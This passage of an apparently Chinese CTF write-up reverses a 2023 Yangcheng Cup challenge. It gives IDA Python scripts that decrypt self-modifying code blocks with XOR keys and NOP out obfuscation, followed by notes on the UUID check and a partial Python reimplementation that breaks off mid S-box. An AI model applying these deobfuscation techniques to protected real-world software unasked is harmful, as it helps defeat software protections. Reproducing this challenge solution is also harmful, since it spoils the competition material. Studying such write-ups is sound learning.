<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">   idc.patch_byte(idc.get_wide_dword(get_reg_value(<span class="string">&quot;rsp&quot;</span>)) - <span class="number">5</span> + i, <span class="number">0x90</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">hex</span>(get_reg_value(<span class="string">&quot;rdi&quot;</span>)) , end = <span class="string">&#x27;,&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>​	先跑一次观察最后的位置，然后在那个位置下断点，然后就可以得到几乎所有代码</p>
<p>​	中间存在特判，可以看出来是 <code>0-9a-e</code>  的类似 uuid 的格式，这里没有执行这些地方的代码，但是 smc 会影响反编译，所以可以手动找到 <code>jnz</code>   <code>jmp</code>  之类的位置手动 patch 一下，然后可以得到 main 函数和一些加解密、check 操作</p>
<p>​	密文：</p>
<p>​	<img loading="lazy" data-src="%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20230922211748973.png" alt="image-20230922211748973"></p>
<p>加密：（这里有个 AES 的 sbox，明显是用来干扰插件的，必须去干净才能看到实际用途）<img loading="lazy" data-src="%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20230922211809507.png" alt="image-20230922211809507"></p>
<p>其实基本上就没啥东西了，这就是 ycb 的零解题…</p>
<h6 id="1011-补个完整流程"><a class="markdownIt-Anchor" href="#1011-补个完整流程">#</a> 10.11 补个完整流程</h6>
<p>首先是 smc 和冗余的去除，前面用的动态 patch 有个问题，在于无法将结果应用回输入文件（文件自 smc 的部分是没办法写回去的，必须自行 patch）</p>
<p>可以考虑动态获取所有 smc 的 base_addr，脚本 smc 进行 patch（脚本来源于 gyc 爷，相当精细的 patch，考虑到很多传参和编译器优化，能几乎完美去除混淆）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line">arr = [</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40235a&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x135&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x0&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x4024de&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x21&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x109cf92e&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x403582&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x23&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x109cf92e&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40256d&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x64&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x109cf92e&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40263a&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x23&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x6f403b1d&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x4026d5&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x36&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x74afec82&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402758&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x36&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x3508284b&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402937&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x14&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x3508284b&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x4029f2&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x22&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x64937846&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402a82&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x39&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x74afec82&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401a35&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x10a&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x0&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401ba2&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x39&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x41b71efb&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401c52&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x57&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x3855b718&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401236&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x1f&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x0&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x4012ac&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x14&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x6b8b4567&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401323&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x15d&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x59f066a1&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x4014b5&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x19&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x3dccfec8&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40150e&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x5c&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x59f066a1&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401ce4&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x22&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x4d10565e&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401d6e&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x3a&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x3855b718&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401e0b&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x44&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x6385d5da&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401ec9&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x3f&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x71a5dd8e&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401f43&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x22&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x3c14fa76&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401fcd&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x2e&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x71a5dd8e&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40205e&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x39&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x6eb33466&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40210e&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0xd2&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x7f23f981&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40160d&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x35&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x0&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x4016a5&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x15&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x19495cff&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x4016fe&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x25&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x33a1c8b5&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40194a&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x20&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x19495cff&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40221b&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x22&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x19ccba0c&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40227d&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x14&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x7f23f981&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402b24&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x23&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x82c08da&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402bbf&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x84&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x2d5d3879&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402c81&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x22&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x4fe6e123&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40178b&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x21&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x19495cff&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40181e&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x21&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x3ac743d6&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x401889&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x2b&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x7c2f3f1b&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402d11&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x21&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x2d5d3879&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402d9b&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x23&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x4fd1b124&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402e33&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x46&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x7ceb0021&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402edf&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x23&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0xef6a336&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402f77&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x21&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x2ab50b6e&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402ffe&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x23&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x7a85187&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x403096&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0xc7&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x60cbd5d9&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x403198&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x22&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x15697d0d&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x403225&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x14&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x60cbd5d9&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x403274&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x22&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x1948596b&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x403301&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x14&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x2ab50b6e&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x403350&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x22&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x21b6eba8&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x4033dd&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x64&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x7ceb0021&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x403526&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x21&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x280f9e95&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402806&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x36&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x3508284B&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40298E&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x21&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x7B62D32D&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x40348B&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x60&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x280F9E95&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x4018F4&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x1b&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x3AC743D6&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;base_addr&quot;</span>: <span class="string">&quot;0x402889&quot;</span>, <span class="string">&quot;len&quot;</span>: <span class="string">&quot;0x36&quot;</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;0x7B62D32D&quot;</span>&#125;,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">base_addr, block_len, key</span>):</span><br><span class="line">    code = get_bytes(base_addr, block_len)</span><br><span class="line">    real_code = <span class="built_in">bytearray</span>(block_len)</span><br><span class="line">    s = [(key &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(block_len):</span><br><span class="line">        real_code[i] = code[i] ^ ((i - <span class="number">50</span>) &amp; <span class="number">0xff</span> ^ s[i % <span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(real_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> block <span class="keyword">in</span> arr:</span><br><span class="line">    base_addr = <span class="built_in">int</span>(block[<span class="string">&#x27;base_addr&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    block_len = <span class="built_in">int</span>(block[<span class="string">&#x27;len&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    key = <span class="built_in">int</span>(block[<span class="string">&#x27;key&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    code = decrypt_block(base_addr, block_len, key)</span><br><span class="line">    patch_bytes(base_addr - <span class="number">5</span>, <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">5</span>)</span><br><span class="line">    patch_bytes(base_addr, code)</span><br><span class="line">    patch_bytes(base_addr + block_len, <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> block <span class="keyword">in</span> arr:</span><br><span class="line">    base_addr = <span class="built_in">int</span>(block[<span class="string">&#x27;base_addr&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    block_len = <span class="built_in">int</span>(block[<span class="string">&#x27;len&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    addr = base_addr - <span class="number">5</span></span><br><span class="line">    regs = [str2reg(<span class="string">&#x27;rdi&#x27;</span>), str2reg(<span class="string">&#x27;rsi&#x27;</span>), str2reg(<span class="string">&#x27;rdx&#x27;</span>)]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">10</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        addr = prev_head(addr, <span class="number">0x400000</span>)</span><br><span class="line">        ins = insn_t()</span><br><span class="line">        decode_insn(ins, addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;mov&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ins.get_canon_mnem():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        op0 = ins.ops[<span class="number">0</span>]</span><br><span class="line">        op1 = ins.ops[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> op0.<span class="built_in">type</span> == idaapi.o_reg:</span><br><span class="line">            <span class="keyword">if</span> op0.reg <span class="keyword">in</span> regs:</span><br><span class="line">                regs.remove(op0.reg)</span><br><span class="line">                <span class="keyword">if</span> op1.<span class="built_in">type</span> == idaapi.o_reg:</span><br><span class="line">                    regs.append(op1.reg)</span><br><span class="line">                patch_bytes(addr, <span class="string">b&#x27;\x90&#x27;</span> * get_item_size(addr))</span><br><span class="line">        <span class="keyword">elif</span> op0.<span class="built_in">type</span> == idaapi.o_displ <span class="keyword">and</span> op1.<span class="built_in">type</span> == idaapi.o_imm:</span><br><span class="line">            patch_bytes(addr, <span class="string">b&#x27;\x90&#x27;</span> * get_item_size(addr))</span><br><span class="line">        <span class="keyword">elif</span> op1.<span class="built_in">type</span> == idaapi.o_reg <span class="keyword">and</span> (op1.reg == str2reg(<span class="string">&#x27;rax&#x27;</span>) <span class="keyword">or</span> op1.reg == str2reg(<span class="string">&#x27;rcx&#x27;</span>)):</span><br><span class="line">            patch_bytes(addr, <span class="string">b&#x27;\x90&#x27;</span> * get_item_size(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    regs = [str2reg(<span class="string">&#x27;rdi&#x27;</span>), str2reg(<span class="string">&#x27;rsi&#x27;</span>), str2reg(<span class="string">&#x27;rdx&#x27;</span>)]</span><br><span class="line">    addr = base_addr + block_len</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">6</span>:</span><br><span class="line">        addr = prev_head(addr, <span class="number">0x400000</span>)</span><br><span class="line">        ins = insn_t()</span><br><span class="line">        decode_insn(ins, addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;mov&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ins.get_canon_mnem():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        op0 = ins.ops[<span class="number">0</span>]</span><br><span class="line">        op1 = ins.ops[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> op0.<span class="built_in">type</span> == idaapi.o_reg:</span><br><span class="line">            <span class="keyword">if</span> op0.reg <span class="keyword">in</span> regs:</span><br><span class="line">                regs.remove(op0.reg)</span><br><span class="line">                <span class="keyword">if</span> op1.<span class="built_in">type</span> == idaapi.o_reg:</span><br><span class="line">                    regs.append(op1.reg)</span><br><span class="line">                patch_bytes(addr, <span class="string">b&#x27;\x90&#x27;</span> * get_item_size(addr))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">refs = idautils.CodeRefsTo(<span class="number">0x4035C0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> ref <span class="keyword">in</span> refs:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    regs = [str2reg(<span class="string">&#x27;rdi&#x27;</span>), str2reg(<span class="string">&#x27;rsi&#x27;</span>), str2reg(<span class="string">&#x27;rdx&#x27;</span>), str2reg(<span class="string">&#x27;rcx&#x27;</span>), str2reg(<span class="string">&#x27;r8&#x27;</span>)]</span><br><span class="line">    addr = ref</span><br><span class="line">    patch_bytes(addr, <span class="string">b&#x27;\x90&#x27;</span> * get_item_size(addr))</span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">6</span>:</span><br><span class="line">        addr = prev_head(addr, <span class="number">0x400000</span>)</span><br><span class="line">        ins = insn_t()</span><br><span class="line">        decode_insn(ins, addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;mov&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ins.get_canon_mnem() <span class="keyword">and</span> <span class="string">&#x27;lea&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ins.get_canon_mnem():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        op0 = ins.ops[<span class="number">0</span>]</span><br><span class="line">        op1 = ins.ops[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> op0.<span class="built_in">type</span> == idaapi.o_reg:</span><br><span class="line">            <span class="keyword">if</span> op0.reg <span class="keyword">in</span> regs:</span><br><span class="line">                regs.remove(op0.reg)</span><br><span class="line">                <span class="keyword">if</span> op1.<span class="built_in">type</span> == idaapi.o_reg:</span><br><span class="line">                    regs.append(op1.reg)</span><br><span class="line">                patch_bytes(addr, <span class="string">b&#x27;\x90&#x27;</span> * get_item_size(addr))</span><br><span class="line">        i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>检查 uuid 格式</p>
<p><img loading="lazy" data-src="%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231012095340707.png" alt="image-20231012095340707"></p>
<p>通过盒做一个转化映射：</p>
<p><img loading="lazy" data-src="%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231012095440758.png" alt="image-20231012095440758"></p>
<p>然后做了一个递推循环（可逆）</p>
<p><img loading="lazy" data-src="%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231012100145373.png" alt="image-20231012100145373"></p>
<p>流程用 python 写一下这样：</p>
<p>(秘钥流需要自己动调获取)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">input</span> =  <span class="string">&#x27;11111111111111111111111111111111&#x27;</span></span><br><span class="line">enc1 = <span class="string">&#x27;ac2018c9c49436ec3154691ea51de52ca91251c38c13722d11a325a18198411e91ca9e4c&#x27;</span></span><br><span class="line">s_box = [ <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>,  <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>,  <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,  <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>,  <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>,  <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,  <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>,  <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,  <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>,  <span class="number">0xBE</span>, 